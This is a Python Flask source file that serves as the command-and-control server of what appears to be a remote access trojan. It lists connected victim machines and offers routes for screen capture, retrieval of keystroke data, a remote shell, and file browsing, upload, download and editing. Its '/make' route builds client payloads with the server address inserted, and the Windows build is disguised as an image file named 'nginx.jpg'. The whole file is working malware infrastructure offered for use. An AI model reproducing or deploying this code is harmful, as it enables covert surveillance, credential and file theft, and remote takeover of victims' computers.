import io
import sys
import os
import base64
import datetime
import json
from flask import Flask, jsonify, request, render_template, send_file
from flask_sockets import Sockets
from tempfile import NamedTemporaryFile
from shutil import copyfile
import time
import zipapp
import threading

app = Flask(__name__)
sockets = Sockets(app)
cache = {}
SPEED = 0.7
HOST = '0.0.0.0'
PORT = 5000


class MSG:
    def __init__(self, ws):
        """
        存放客户端，用于后期收发消息加锁
        :param ws:
        """
        self.lock = threading.RLock()
        self.ws = ws

    def get_data(self, data: dict) -> dict:
        wait_data = json.dumps(data)
        _data = {}
        self.lock.acquire()
        try:
            self.ws.send(wait_data)
            _data = self.ws.receive()
        except Exception as e:
            pass
        finally:
            self.lock.release()
        return json.loads(_data)


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/base')
def base():
    """
    返回客户端逻辑代码，动态加载
    :return:
    """
    with open("base.py", "r", encoding="utf8") as f:
        return f.read()


@app.route('/api.json')
def api():
    return jsonify({"code": 0, "data": [{"uid": i, "system": cache[i][1], "uptime": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")} for i in cache.keys()]})


@sockets.route("/ping")
def ping(ws):
    msg = json.loads(ws.receive())
    uid = msg['uid']
    cache.update({uid: [MSG(ws), msg["system"]]})
    while not ws.closed:
        time.sleep(3)
    cache.pop(uid)


@app.route('/capture/<uid>', methods=['GET', 'POST'])
def capture(uid):
    if request.method == "GET":
        return render_template('capture.html', speed=SPEED)
    else:
        _data = cache[uid][0].get_data({"v_uid": "0222", "type": "capture"})
        return jsonify(_data)


@app.route('/key/<uid>', methods=['GET', 'POST'])
def key(uid):
    _data = cache[uid][0].get_data({"v_uid": "0222", "type": "key"})
    code = base64.b64decode(_data["data"]).decode()
    return render_template('key.html', code=code)


@app.route('/shell/<uid>', methods=['GET', 'POST'])
def shell(uid):
    if request.method == "GET":
        return render_template('shell.html')
    else:
        _key = json.loads(request.data.decode())["data"]
        _data = cache[uid][0].get_data({"v_uid": "0222", "type": "shell", "data": _key})
        return jsonify(_data)


@app.route('/file/<uid>', methods=['GET', 'POST'])
def file(uid):
    if request.method == "GET":
        return render_template('file.html')
    elif request.form.get("dir"):
        _data = cache[uid][0].get_data({"v_uid": "0222", "type": "dir", "data": request.form.get("dir")})
        return jsonify({"code": 0, "data": _data["raw"]})
    elif request.form.get("action") == "upload":
        _file = request.files["file"]
        _path = request.form.get("src_path")
        _file_data = base64.b64encode(_file.read()).decode()
        _data = cache[uid][0].get_data({"v_uid": "0222", "type": "upload", "data": {"path": _path, "filename": _file.filename, "data": _file_data}})
        return jsonify(_data)
    else:
        data = json.loads(request.data)
        if data["action"] == "download":
            _data = cache[uid][0].get_data({"v_uid": "0222", "type": data["action"], "data": data})
            with open("static/files/{}".format(data["filename"]), "wb") as f:
                f.write(base64.b64decode(_data["data"]))
            return jsonify({"code": 0})
        _data = cache[uid][0].get_data({"v_uid": "0222", "type": data["action"], "data": data})
        return jsonify({"code": 0, "data": _data["raw"]})


@app.route('/edit/<uid>', methods=['GET', 'POST'])
def edit(uid):
    if request.method == "GET":
        path = request.args.get("path")
        assert path
        _data = cache[uid][0].get_data({"v_uid": "0222", "type": "edit", "data": {"path": path}})
        return render_template('edit.html', code=_data["raw"]["data"])
    else:
        path = request.args.get("path")
        data = json.loads(request.data)["data"]
        _data = cache[uid][0].get_data({"v_uid": "0222", "type": "edit", "data": {"path": path, "data": data}})
        return jsonify(_data)


@app.route("/make", methods=['GET', 'POST'])
def make():
    if request.method == "GET":
        return render_template('make.html')
    else:
        data = json.loads(request.data)
        app_file = open("app.py","r", encoding="utf8")
        with open("../client/__main__.py", "w", encoding="utf8") as f:
            code = app_file.read().replace("#SERVER_ADDRESS", data["address"])
            f.write(code)
        if data["target"] == "linux":
            temp = io.BytesIO()
            zipapp.create_archive('../client', temp, '/usr/bin/env python3', compressed=True)
            with open('../buildout/linux', 'wb') as f:
                f.write(temp.getvalue())
            os.remove("../client/__main__.py")
            return jsonify({"code": 0, "msg": "创建成功 ---> buildout/linux"})
        elif data["target"] == "win":
            temp = io.BytesIO()
            zipapp.create_archive('../client', temp, 'python.exe', compressed=True)
            with open('../buildenv/nginx.jpg', 'wb') as f:
                f.write(temp.getvalue())
            os.remove("../client/__main__.py")
            return jsonify({"code": 0, "msg": "请手动运行目录下的 build.cmd 进行cab编译打包,一直点下一步"})


def main():
    from gevent import pywsgi
    from geventwebsocket.handler import WebSocketHandler
    from gevent import monkey
    monkey.patch_all()
    server = pywsgi.WSGIServer((HOST, PORT), app, handler_class=WebSocketHandler)
    print("server run at", "http://{}:{}".format(HOST, PORT))
    try:
        server.serve_forever()
    except KeyboardInterrupt as e:
        server.stop()
        sys.exit()


if __name__ == '__main__':
    main()
